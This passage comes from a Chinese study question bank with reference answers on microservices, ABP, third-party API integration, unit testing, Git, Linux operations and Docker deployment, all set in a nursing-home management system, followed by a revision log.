**参考答案**：Ocelot 支持两种主要的负载均衡策略：RoundRobin（轮询）和 LeastConnection（最少连接）。RoundRobin 按顺序轮流分配请求，每个实例获得相同数量的请求，适合实例性能一致的场景。LeastConnection 优先将请求分配给当前活跃连接数最少的实例，适合实例处理能力不同或请求处理时间差异大的场景。在养老院系统中，如果财务服务有两个实例且处理能力相同，用 RoundRobin；如果一个实例配置较高，用 LeastConnection 更合理。

### 第10题（高级 / 设计题）
**题目**：微服务拆分应该遵循什么原则？什么时候不应该拆分？

**参考答案**：微服务拆分应遵循业务边界原则，按限界上下文拆分，每个服务拥有独立的数据存储。以养老院为例，长者管理、财务管理、护理管理是三个独立的业务域，应该拆分为独立服务。拆分时还要考虑团队组织结构（康威定律）、数据独立性和部署独立性。不应该拆分的情况包括：团队规模小（少于 5 人）、业务逻辑简单、不需要独立部署、网络延迟对性能影响大。盲目拆分会增加运维复杂度，得不偿失。

### 第11题（中级 / 概念题）
**题目**：什么是降级策略？与熔断策略有什么区别？

**参考答案**：降级策略是在服务不可用时返回兜底数据，保证用户仍能获得基本功能；熔断策略是在检测到下游服务故障时主动切断调用，避免级联故障。区别在于：熔断是被动触发（基于失败率），降级是主动设计（预先准备兜底方案）。在养老院系统中，当财务服务熔断后，长者信息查询可以触发降级，返回「财务信息暂时不可用」的友好提示，而不是直接报错。熔断和降级通常配合使用，熔断是前提，降级是结果。

### 第12题（中级 / 场景题）
**题目**：滑动窗口限流相比固定窗口限流有什么优势？

**参考答案**：固定窗口限流在窗口边界存在突刺问题——第一个窗口末尾和第二个窗口开头可以短时间内通过两倍于限制的请求。滑动窗口将时间窗口划分为多个小格子，每次滑动一格统计最近一段时间的请求总量，有效避免了边界突刺。以养老院前台为例，固定窗口每分钟限 100 人，如果第一分钟最后 1 秒来了 100 人，第二分钟第 1 秒又来 100 人，2 秒内通过了 200 人。滑动窗口则会统计最近 1 分钟内的总数，有效平滑限流。

### 第13题（高级 / 设计题）
**题目**：在 ABP 框架中如何实现微服务间的 HTTP 调用？有哪些方式？

**参考答案**：ABP 框架提供了两种微服务间 HTTP 调用方式。第一种是动态代理（HttpClientProxy），在契约层定义接口，ABP 自动生成 HTTP 客户端实现，使用时像调用本地方法一样，配置 `RemoteServices` 指定目标服务地址即可。第二种是直接使用 `IHttpClientFactory`，手动发送 HTTP 请求。推荐使用动态代理方式，因为它与 ABP 的依赖注入、异常处理、序列化等机制深度集成。在养老院系统中，长者服务需要查询财务信息时，通过 `IBillingAppService` 接口的动态代理即可透明调用财务服务。

### 第14题（初级 / 概念题）
**题目**：什么是请求聚合？在什么场景下使用？

**参考答案**：请求聚合是 API 网关将一个外部请求分解为多个内部请求，分别调用不同的下游服务，最后将多个响应合并为一个响应返回给客户端。适用场景是前端需要同时获取多个服务的数据，但不希望发起多次请求。在养老院系统中，长者仪表盘页面需要同时显示长者基本信息（来自长者服务）和费用信息（来自财务服务），网关的聚合路由可以一次请求拿到两个服务的数据，减少网络往返次数，提升用户体验。

---

## 第 20 章：第三方服务集成

### 第1题（中级 / 概念题）
**题目**：为什么不能直接 `new HttpClient()`？

**参考答案**：两个问题：①Socket 耗尽——每个 HttpClient 实例有独立连接池，大量短生命周期实例导致 TCP 端口耗尽（端口释放有 TIME_WAIT 期）；②DNS 刷新——HttpClient 长连接不会感知 DNS 变更，如果第三方服务 IP 变了，HttpClient 还连旧 IP。解决方案是 `IHttpClientFactory`，它管理 HttpClient 生命周期，复用 HttpMessageHandler，避免两个问题。养老院场景：调用微信 API 和阿里云 SMS 都必须用 IHttpClientFactory。

---

### 第2题（初级 / 概念题）
**题目**：IHttpClientFactory 有哪几种使用方式？

**参考答案**：三种：①基本用法——`_factory.CreateClient()` 创建默认客户端；②命名客户端——`_factory.CreateClient("WeChat")` 创建命名客户端，可为不同服务配置不同基地址和超时；③类型化客户端——定义 `WeChatClient` 类，构造函数注入 `HttpClient`，通过 DI 注册 `services.AddHttpClient<WeChatClient>()`。养老院场景：微信 API 用类型化客户端（`WeChatClient`），阿里云 SMS 用命名客户端（`AliyunSms`）。

---

### 第3题（高级 / 场景题）
**题目**：如何为不同的第三方服务配置不同的 Polly 策略？

**参考答案**：在 `AddHttpClient` 时链式配置 Polly。微信登录配置重试 3 次 + 指数退避（临时故障可恢复）；短信发送配置重试 2 次 + 熔断 5 次失败后断路 30 秒（防止短信服务商宕机拖垮系统）；OSS 上传配置超时 30 秒 + 重试 1 次（大文件上传需要长超时）。养老院场景：不同服务的可靠性不同，策略要差异化配置。

---

### 第4题（初级 / 概念题）
**题目**：微信扫码登录的完整流程是什么？

**参考答案**：OAuth2 授权码模式：①前端跳转微信授权页（带 AppId + RedirectUri + State）；②用户扫码确认；③微信回调带 code + state；④后端校验 state 防 CSRF；⑤用 code 换 access_token + openid；⑥用 openid 查是否已绑定系统账号；⑦已绑定签发 JWT，未绑定引导绑定。养老院场景：家属扫码绑定长者账号，查看亲人健康信息。

---

### 第5题（中级 / 概念题）
**题目**：阿里云短信发送需要注意什么？

**参考答案**：①模板必须提前审核通过，不能动态拼接内容；②签名必须是已审核的名称；③同一手机号每分钟最多 1 条、每天最多 10 条（防骚扰）；④发送失败要重试但不能无限重试；⑤敏感信息（验证码）不能写入日志。养老院场景：长者体征异常时短信通知家属，模板内容为"您的亲人XXX体征异常，请及时关注"。

---

### 第6题（中级 / 概念题）
**题目**：OSS 签名 URL 是什么？什么场景用？

**参考答案**：签名 URL（Presigned URL）是带临时授权的文件访问链接，有效期可配置（如 10 分钟）。客户端拿到签名 URL 后可直接访问 OSS 文件，无需经过应用服务器。场景：①前端直接上传大文件到 OSS（减轻应用服务器压力）；②生成临时下载链接给家属查看长者健康报告。养老院场景：月度健康报告生成后，生成 24 小时有效的签名 URL 发送给家属。

---

### 第7题（初级 / 概念题）
**题目**：MailKit 发送邮件的基本流程是什么？

**参考答案**：创建 `MimeMessage`（设置收件人/主题/正文）→ 创建 `Multipart`（添加正文和附件）→ 创建 `SmtpClient` → 连接 SMTP 服务器 → 认证 → 发送 → 断开。注意：①必须用 `using` 包裹 SmtpClient 确保连接释放；②异步发送用 `SendAsync`；③生产环境配置 SMTP 服务器地址和认证信息通过 Options 模式注入。养老院场景：每月自动发送费用明细邮件给家属。

---

### 第8题（高级 / 场景题）
**题目**：第三方服务宕机时如何做降级？

**参考答案**：Polly 降级策略：当重试和熔断都失败后，执行降级逻辑返回默认值。短信服务宕机时降级为"记录到数据库，服务恢复后补发"；微信登录宕机时降级为"提示用户稍后重试或使用手机号登录"。养老院场景：家属查看健康报告的 OSS 签名 URL 生成失败时，降级为"报告正在生成中，请稍后刷新"。

---

### 第9题（中级 / 概念题）
**题目**：钉钉考勤 API 对接的关键点是什么？

**参考答案**：①Access Token 有效期 2 小时，需要缓存并自动刷新；②考勤数据通过 Webhook 回调推送，需要配置回调地址并验证签名；③排班数据需要定时同步（每天凌晨拉取全量排班）。养老院场景：护理员排班在钉钉中管理，系统每天凌晨同步排班数据，考勤打卡数据实时回调同步到养老院系统。

---

### 第10题（高级 / 设计题）
**题目**：如何设计一个统一的第三方服务封装层？

**参考答案**：定义接口（如 `ISmsService`/`IEmailService`/`IFileStorageService`），每个接口有具体实现（`AliyunSmsService`/`MailKitEmailService`/`OssStorageService`）。通过 DI 注册，业务代码只依赖接口。配置通过 Options 模式注入。重试/超时/熔断策略在 `AddHttpClient` 时统一配置。养老院场景：如果从阿里云短信切换到腾讯云短信，只需新增 `TencentSmsService` 实现同一接口，业务代码零修改。

---

### 第11题（初级 / 概念题）
**题目**：Polly 的重试策略有哪些模式？

**参考答案**：三种：①固定间隔——每次重试间隔相同（如 2 秒）；②指数退避——每次重试间隔翻倍（2s→4s→8s），适合临时故障恢复；③随机抖动——在指数退避基础上加随机偏移，避免多客户端同时重试造成"惊群效应"。养老院场景：调用微信 API 用指数退避重试（临时限流可能很快恢复），调用短信服务用固定间隔重试。

---

### 第12题（高级 / 设计题）
**题目**：如何保证第三方服务调用的可观测性？

**参考答案**：三层保障：①日志——每次调用记录请求参数、响应状态、耗时（Serilog 结构化日志）；②指标——成功率、平均耗时、P99 耗时（Prometheus 指标）；③告警——成功率低于 95% 或 P99 超过 5 秒时触发告警。养老院场景：微信登录成功率下降到 90% 时自动告警，运维人员及时排查。

### 第13题（中级 / 场景题）
**题目**：养老院小程序支付成功后，为什么不能立即更新账单支付状态？

**参考答案**：因为小程序支付成功只代表银联扣款成功，资金尚未到达养老院对公账户。银联采用 T+1 划付机制，资金在次日才划付到养老院账户。财务需要先导入银行划付流水，再认领关联到对应账单明细，才算完成真正的入账。如果支付成功就更新账单状态，可能出现「账单显示已支付但资金未到账」的不一致情况。养老院场景：家属在小程序缴费后，账单状态显示「待确认」，等财务 T+1 认领后才变为「已支付」。

### 第14题（高级 / 设计题）
**题目**：如何设计银行流水认领的幂等性？

**参考答案**：银行流水认领的幂等性通过三层保障实现：①流水号唯一约束——数据库对 TransactionNo 建唯一索引，重复导入自动跳过；②认领状态校验——认领前检查 ClaimStatus 是否为「未认领」，已认领的流水拒绝重复操作；③金额校验——认领金额不得超过账单明细应付金额，防止超额认领。养老院场景：财务误操作重复导入同一批银行流水时，系统自动跳过已导入的流水，不会产生重复数据。

### 第15题（中级 / 概念题）
**题目**：金蝶云·星空 WebAPI 的 Save/Submit/Audit 三步分别做什么？

**参考答案**：**Save**（保存）将单据数据提交到金蝶数据库，状态为「暂存」，可以修改；**Submit**（提交）将暂存单据提交审核，状态变为「已提交」，不可直接修改；**Audit**（审核）确认单据生效，生成凭证，状态变为「已审核」。养老院场景：收款单先 Save 保存（可修改），再 Submit 提交（锁定），最后 Audit 审核（生成财务凭证）。如果审核失败，需要先反审核再修改。

### 第16题（高级 / 场景题）
**题目**：所有退款都不支持原路退回，这对系统设计有什么影响？

**参考答案**：不支持原路退回意味着系统不需要调用银行/银联的退款接口，退款流程简化为：生成退款单 → 审批 → 同步金蝶退款单 → 财务线下打款。设计影响：①退款单只需记录退款金额、收款人、退款原因，不需要记录银行退款流水号；②退款状态流转变为「待审批→已审批→已退款」，没有「退款中」状态；③退款确认由财务手动操作，系统只做记录和金蝶同步。养老院场景：家属申请退住退款，系统生成退款单，院长审批通过后，财务通过银行转账退款，再在系统中确认退款完成。

### 第17题（中级 / 概念题）
**题目**：合同账单和长者账单有什么区别？为什么要分开？

**参考答案**：合同账单是系统核心财务账单，基于入住合同自动生成，管理真实应收、分期明细和支付状态，是财务核算的依据。长者账单是面向家属展示的聚合账单，将合同账单和无合同账单按自然周期聚合，用于小程序展示和缴费。分开的原因：①合同账单有复杂的分期逻辑（首期/尾期/续签衔接），直接展示给家属太复杂；②长者账单需要聚合多个合同和无合同费用，简化为月度总额；③长者账单可以有多个版本（每次聚合生成新版本），合同账单只有一份。养老院场景：财务看合同账单做核算，家属看长者账单缴费。

### 第18题（高级 / 设计题）
**题目**：如何设计金蝶对接的容错机制？

**参考答案**：金蝶对接的容错设计包括：①重试机制——金蝶接口偶发超时，配置 Polly 指数退避重试 3 次；②幂等设计——每张单据携带唯一业务编号，金蝶侧用编号去重；③失败队列——同步失败的单据记录到失败队列，由定时任务定期重试；④手动补偿——Dashboard 展示同步失败的单据，支持财务手动重新推送；⑤session 管理——金蝶 session 有效期 30 分钟，客户端自动续期。养老院场景：凌晨同步收款单时金蝶临时维护导致失败，系统记录失败原因，次日凌晨自动重试，或财务上班后手动触发重新同步。

---




## 第 21 章：单元测试与质量保障

### 第1题（初级 / 概念题）
**题目**：什么是单元测试？为什么养老院系统需要单元测试？

**参考答案**：单元测试是针对代码中最小可测试单元进行验证的自动化测试。养老院系统的账单计算、护理等级变更等业务直接涉及金钱，一旦出错影响重大。单元测试能在代码提交阶段就发现 bug，避免账单计算逻辑改错后上线才发现问题。它相当于给代码买了一份保险，用少量编写时间换取大量排查时间。

---

### 第2题（初级 / 代码题）
**题目**：xUnit 中 `[Fact]` 和 `[Theory]` 有什么区别？

**参考答案**：`[Fact]` 标记无参数测试，执行一次。`[Theory]` 标记参数化测试，配合 `[InlineData]` 或 `[MemberData]` 用多组参数执行多次。养老院系统中验证不同护理等级的费率时，用 `[Theory]` + `[InlineData]` 可以一次性测试所有等级，减少重复代码。

---

### 第3题（中级 / 概念题）
**题目**：什么是 Mock？为什么要 Mock 依赖？

**参考答案**：Mock 是创建替身对象来替代真实依赖。比如 `BillingAppService` 依赖 `IRepository<Elder>` 查询长者信息，测试时用 NSubstitute 创建 Mock 仓储，手动设置返回数据。这样测试只验证业务逻辑本身，不受数据库状态影响。例如 Mock 返回费率 200 元/天的长者，验证 30 天账单是否为 6000 元。

---

### 第4题（中级 / 代码题）
**题目**：如何用 NSubstitute 验证某个方法被调用了指定次数？

**参考答案**：使用 `Received()` 方法。养老院入住测试中验证床位状态更新：`await _bedRepo.Received(1).UpdateAsync(Arg.Is<Bed>(b => b.Status == BedStatus.Occupied))`，表示 UpdateAsync 应被调用恰好 1 次。验证未被调用用 `_repo.DidNotReceive()`。

---

### 第5题（中级 / 概念题）
**题目**：仓储测试、服务测试、API 测试分别验证什么？

**参考答案**：仓储测试验证数据访问层操作是否正确，优点是接近真实场景，缺点依赖数据库较慢。服务测试用 Mock 替代仓储验证业务逻辑，优点是快且聚焦，缺点不验证真实数据库交互。API 测试通过 HTTP 调用验证完整链路，优点覆盖最全，缺点最慢且维护成本高。养老院项目建议以服务测试为主。

---

### 第6题（高级 / 概念题）
**题目**：什么是测试覆盖率？为什么不应追求 100%？

**参考答案**：测试覆盖率是被测试执行到的代码行数占总代码行数的比例。100% 只代表每行代码被执行过，不代表逻辑正确。养老院系统应优先保证账单计算、入住退住等核心流程的高覆盖率，DTO 和枚举等无逻辑代码不需追求覆盖。过度追求覆盖率会导致团队编写无意义测试，增加维护成本。

---

### 第7题（初级 / 代码题）
**题目**：Shouldly 和原生 Assert 有什么区别？

**参考答案**：原生写法 `Assert.Equal(78, elder.Age)`，Shouldly 写法 `elder.Age.ShouldBe(78)`。Shouldly 语法更自然，读起来像"年龄应该是78岁"，断言失败时也提供更好的错误信息。养老院项目中使用 Shouldly 让非技术人员也能理解测试意图，如 `result.Total.ShouldBeGreaterThanOrEqualTo(0)`。

---

### 第8题（高级 / 设计题）
**题目**：养老院系统中哪些模块应优先编写测试？

**参考答案**：第一优先账单计算模块，涉及金钱出错后果最严重；第二优先入住退住流程，涉及床位和长者状态联动；第三优先护理等级变更，影响后续费用计算。测试策略上核心业务用服务层单元测试覆盖所有分支，重要端到端流程用集成测试补充，UI 和 API 层做冒烟测试即可。聚焦高风险区域而非追求全覆盖。

---

### 第9题（中级 / 概念题）
**题目**：集成测试和单元测试的区别是什么？

**参考答案**：单元测试只测试一个类或方法的逻辑，所有外部依赖被 Mock，速度快但不验证真实交互。集成测试启动真实依赖（如内存数据库），验证多个组件协作，较慢但更接近真实。养老院系统验证"账单=床位费+护理费"用单元测试即可；验证"入住后数据库能查到记录"需要集成测试。两者互补。

---

### 第10题（高级 / 设计题）
**题目**：测试代码应该和生产代码放在同一个项目中吗？

**参考答案**：不应该。测试代码应放在独立测试项目中。第一，测试依赖（xUnit、NSubstitute）不应打包到生产部署中；第二，测试项目可引用生产项目但反之不行，保持依赖方向单一；第三，独立项目可单独编译和运行，方便 CI/CD 集成。养老院系统的生产环境只应包含业务代码，Fake 实现和测试数据不应出现在部署包中。

---

### 第11题（高级 / 代码题）
**题目**：如何测试一个会抛出异常的业务方法？

**参考答案**：xUnit 使用 `Assert.ThrowsAsync<BusinessException>(() => service.MethodAsync())`。Shouldly 使用 `Should.ThrowAsync<BusinessException>(() => service.MethodAsync())`。养老院场景中年龄不足 60 岁办理入住，应断言抛出 BusinessException 且消息包含"年龄"。注意不仅验证异常类型，还要验证异常消息是否正确。

---

### 第12题（高级 / 代码题）
**题目**：ABP 框架中如何配置集成测试的测试模块？

**参考答案**：创建类继承 AbpModule 并标记 `[DependsOn]` 依赖主应用模块和 EF Core 模块。在 `ConfigureServices` 中用 `UseInMemoryDatabase("TestDb")` 替换数据库，用 `context.Services.Replace()` 替换外部依赖为 Fake 实现。测试类继承 `AbpIntegratedTest<YourTestModule>`，通过 `GetRequiredService<T>()` 获取服务实例。会启动完整 ABP 容器包括依赖注入和工作单元。

---


## 第 22 章：Git 工作流与 Linux 运维基础

### 第1题（初级 / 概念题）
**题目**：Git 的工作区、暂存区、仓库分别是什么？

**参考答案**：工作区是你编辑代码的目录（看到的文件）；暂存区（Index）是 `git add` 后的中间状态，准备提交的快照；仓库（Repository）是 `git commit` 后的永久记录。养老院场景：修改了长者护理计划（工作区）→ `git add` 标记为待提交（暂存区）→ `git commit` 保存历史记录（仓库）。

---

### 第2题（初级 / 概念题）
**题目**：git merge 和 git rebase 有什么区别？

**参考答案**：`merge` 保留分支历史，创建合并提交（非线性），适合公共分支。`rebase` 将提交"搬到"目标分支顶部（线性历史），适合本地未推送的提交。养老院场景：feature 分支开发完成后合并到 develop 用 `merge`；本地提交整理用 `rebase`。黄金法则：已推送到远程的提交不要 rebase。

---

### 第3题（中级 / 概念题）
**题目**：GitFlow 和 Trunk-Based 分支策略有什么区别？

**参考答案**：GitFlow 有 main/develop/feature/release/hotfix 五种分支，适合发布周期长的项目。Trunk-Based 所有人直接在 main 上开发，用 feature flag 控制功能发布，适合持续部署。养老院系统版本迭代较慢，推荐 GitFlow；如果团队成熟且有完善 CI/CD，可考虑 Trunk-Based。

---

### 第4题（初级 / 概念题）
**题目**：如何解决 Git 合并冲突？

**参考答案**：`git pull` 或 `git merge` 后出现冲突标记（`<<<<<<<`/`=======`/`>>>>>>>`），手动编辑文件选择保留哪部分，然后 `git add` + `git commit`。养老院场景：张工和李工同时修改了护理计划的同一段落，合并时需要人工判断保留谁的修改或合并两者。

---

### 第5题（中级 / 概念题）
**题目**：Code Review 时应该关注哪些要点？

**参考答案**：① 代码正确性（逻辑是否正确）；② 安全性（SQL 注入、XSS、权限检查）；③ 性能（N+1 查询、大对象分配）；④ 可读性（命名规范、注释）；⑤ 测试覆盖（是否有单元测试）。养老院场景：Review 账单计算 PR 时，重点检查金额精度（decimal vs double）、边界条件（入住当天是否计费）。

---

### 第6题（初级 / 概念题）
**题目**：.gitignore 应该忽略哪些 .NET 项目文件？

**参考答案**：`bin/`、`obj/`（编译输出）、`.vs/`（VS 配置）、`*.user`（用户设置）、`appsettings.Development.json`（本地配置）、`*.log`（日志文件）。不应该忽略：`appsettings.json`（模板配置）、`*.csproj`（项目文件）。养老院场景：`.env` 文件含数据库密码，必须加入 .gitignore。

---

### 第7题（中级 / 场景题）
**题目**：如何用 Linux 命令排查 .NET 应用的 CPU 高问题？

**参考答案**：① `top` 查看哪个进程 CPU 高（找到 dotnet 进程 PID）；② `top -Hp <PID>` 查看哪个线程；③ `dotnet-dump collect -p <PID>` 收集转储；④ `dotnet-dump analyze` 查看线程堆栈。养老院场景：账单生成接口响应慢，`top` 发现 dotnet 进程 CPU 90%，用 dump 分析发现死循环。

---

### 第8题（初级 / 概念题）
**题目**：systemctl 的常用命令有哪些？

**参考答案**：`systemctl start/stop/restart/status <服务名>` 管理服务，`systemctl enable/disable <服务名>` 设置开机自启，`journalctl -u <服务名> -f` 查看实时日志。养老院场景：养老院 API 服务挂了，`systemctl status nursinghome-api` 查看状态，`systemctl restart nursinghome-api` 重启。

---

### 第9题（中级 / 概念题）
**题目**：tail -f 和 grep 在日志排查中怎么配合使用？

**参考答案**：`tail -f /var/log/nursinghome/app.log` 实时查看日志输出，`tail -f app.log | grep ERROR` 只看错误日志，`grep -n "Exception" app.log` 搜索异常并显示行号，`grep -C 5 "错误关键词" app.log` 显示匹配行前后 5 行上下文。养老院场景：排查账单生成失败，`tail -f app.log | grep -i "bill"` 实时过滤账单相关日志。

---

### 第10题（初级 / 概念题）
**题目**：SSH 密钥认证和密码认证有什么区别？

**参考答案**：密码认证每次输入密码，易被暴力破解。密钥认证用公私钥对，私钥本地保存，公钥放服务器，更安全且免密登录。配置：`ssh-keygen -t rsa` 生成密钥，`ssh-copy-id user@server` 上传公钥。养老院场景：部署服务器用密钥认证，禁止密码登录，提高安全性。

---

### 第11题（中级 / 场景题）
**题目**：如何用 firewall-cmd 开放端口？

**参考答案**：`firewall-cmd --permanent --add-port=5000/tcp` 永久开放 5000 端口，`firewall-cmd --reload` 重新加载规则，`firewall-cmd --list-ports` 查看已开放端口。养老院场景：部署养老院 API（端口 5000）和 Redis（端口 6379），需要开放这两个端口。注意：Redis 端口只对内网开放，不对公网开放。

---

### 第12题（高级 / 设计题）
**题目**：描述养老院系统从开发到上线的完整 Git 工作流。

**参考答案**：① 从 develop 创建 feature 分支（`feature/elder-checkin`）；② 本地开发 + 测试；③ 推送 + 创建 PR；④ Code Review（至少一人审核）；⑤ 合并到 develop；⑥ CI 自动构建 + 测试；⑦ 从 develop 创建 release 分支；⑧ 测试环境验证；⑨ 合并到 main + 打 Tag；⑩ CD 自动部署到生产。紧急修复走 hotfix 分支。

---


## 第 23 章：Docker 容器化 CI/CD 与生产运维

### 第1题（初级 / 概念题）
**题目**：Docker 镜像和容器有什么区别？

**参考答案**：镜像是只读模板（蓝图），容器是镜像的运行实例（实体）。一个镜像可以创建多个容器。生活类比：镜像是养老院的建筑图纸，容器是按图纸建好的养老院大楼。`docker build` 创建镜像，`docker run` 启动容器。

---

### 第2题（中级 / 概念题）
**题目**：什么是多阶段构建？为什么要用？

**参考答案**：多阶段构建在 Dockerfile 中使用多个 `FROM`，第一阶段编译代码（含 SDK），第二阶段只拷贝编译结果到轻量运行时镜像。养老院场景：编译阶段用 `mcr.microsoft.com/dotnet/sdk:5.0`（1GB），运行阶段用 `mcr.microsoft.com/dotnet/aspnet:5.0`（200MB），最终镜像只有运行时和编译产物。

---

### 第3题（初级 / 概念题）
**题目**：Docker Compose 的作用是什么？

**参考答案**：用 YAML 文件定义和管理多容器应用。一条 `docker-compose up -d` 启动所有服务（MySQL + Redis + RabbitMQ + 应用）。养老院场景：开发环境一条命令启动完整技术栈，不用手动逐个启动。`docker-compose down` 一键停止并清理。

---

### 第4题（中级 / 概念题）
**题目**：Docker 环境变量如何替换 appsettings.json 配置？

**参考答案**：ASP.NET Core 的配置系统支持环境变量覆盖，用双下划线 `__` 表示 JSON 层级。`ConnectionStrings__Default=xxx` 覆盖 `ConnectionStrings:Default`。在 docker-compose.yml 的 `environment` 段配置。与第 3 章呼应：开发用 appsettings.json，Docker 部署用环境变量。

---

### 第5题（高级 / 场景题）
**题目**：如何用 GitHub Actions 实现 CI/CD？

**参考答案**：在 `.github/workflows/deploy.yml` 定义流水线：push 到 main 触发 → checkout 代码 → `dotnet build` → `dotnet test` → `docker build` → `docker push` 到镜像仓库 → SSH 到服务器 `docker-compose pull && docker-compose up -d`。养老院场景：张工合并 PR 后，自动构建、测试、部署到生产服务器，全程无需手动操作。

---

### 第6题（中级 / 概念题）
**题目**：Nginx 反向代理的作用是什么？

**参考答案**：Nginx 作为入口，将请求转发给后端 Kestrel 应用。作用：① SSL 终止（HTTPS → HTTP）；② 负载均衡（多个应用实例）；③ 静态文件服务；④ 安全防护（IP 黑名单、限流）。养老院场景：Nginx 监听 443 端口（HTTPS），转发到 Kestrel 的 5000 端口。

---

### 第7题（初级 / 概念题）
**题目**：Docker Volume 的作用是什么？

**参考答案**：Volume 是持久化存储，数据独立于容器生命周期。容器删除后 Volume 数据仍在。养老院场景：MySQL 数据文件挂载到 `/var/lib/mysql`，Redis 持久化文件挂载到 `/data`，上传的健康档案挂载到 `/uploads`。不用 Volume 的话，`docker-compose down` 后数据全丢。

---

### 第8题（高级 / 场景题）
**题目**：生产环境 CPU 使用率突然飙到 100%，怎么排查？

**参考答案**：① `top` 找到高 CPU 进程（dotnet PID）；② `docker stats` 确认是哪个容器；③ `docker exec -it <container> top -Hp 1` 找高 CPU 线程；④ 收集 dump（`dotnet-dump collect -p 1`）；⑤ 分析线程堆栈找死循环或高频 GC。养老院场景：账单批量生成任务死循环导致 CPU 100%。

---

### 第9题（中级 / 概念题）
**题目**：如何做数据库定时备份？

**参考答案**：用 `mysqldump` 导出 + crontab 定时执行。`mysqldump -u root -p nursinghome > backup_$(date +%Y%m%d).sql`。crontab 每天凌晨 3 点执行：`0 3 * * * /usr/local/bin/backup.sh`。备份文件保留 30 天，建议异地存储（如 OSS）。养老院场景：每天自动备份，出故障时可恢复到前一天的数据。

---

### 第10题（高级 / 设计题）
**题目**：如何设计养老院系统的 Docker Compose 编排？

**参考答案**：5 个服务：mysql（3306 + Volume 持久化）、redis（6379）、rabbitmq（5672 + 15672 管理界面）、nursinghome-api（5000 + 依赖 mysql/redis/rabbitmq + healthcheck）、nginx（80/443 + 反向代理 api）。用 `depends_on` + `condition: service_healthy` 确保依赖服务就绪后再启动 API。`.env` 文件管理密码。

---

## 修订记录
| 日期 | 版本 | 变更内容 |
|------|------|---------|
| 2026-07-13 | v1.7 | 合并 CH16 答案修正 + CH20 扩写财务对接（新增 6 题 12→18）；难度分布修正为初级 87 / 中级 118 / 高级 92 |
| 2026-07-10 | v1.5 | 补全 CH14 共 12 题参考答案（题目已在 v1.4 完成） |
| 2026-07-10 | v1.4 | 补全 CH14（12题完整题目+答案）、CH17（13题补题目）、CH19（14题补题目） |
| 2026-07-10 | v1.3 | 全量重导：修复CH13重复答案、CH14占位、CH17/19缺失题目，291题完整无截断 |